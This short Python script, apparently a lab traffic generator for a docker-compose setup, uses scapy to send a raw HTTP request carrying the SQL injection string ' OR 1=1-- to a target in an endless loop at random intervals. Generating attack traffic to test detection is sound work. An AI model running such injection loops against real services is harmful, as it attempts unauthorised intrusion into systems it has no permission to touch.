import sys
# scripts/generate_attack_loop.py
import time, random
from scapy.all import IP, TCP, Raw, send

def generate_sql_injection(target_ip: str):
    pkt = IP(dst=target_ip)/TCP(dport=80)/Raw(
        b"GET /?id=' OR 1=1-- HTTP/1.1\r\nHost: example.com\r\n\r\n"
    )
    send(pkt, verbose=False)

if __name__ == '__main__':
    TARGET = sys.argv[1]  # ім’я сервісу в docker-compose
    while True:
        generate_sql_injection(TARGET)
        # чекаємо від 5 до 30 секунд рандомно
        sleep_sec = random.uniform(5, 30)
        print(f"[attacker] sent SQLi, sleeping {sleep_sec:.1f}s")
        time.sleep(sleep_sec)
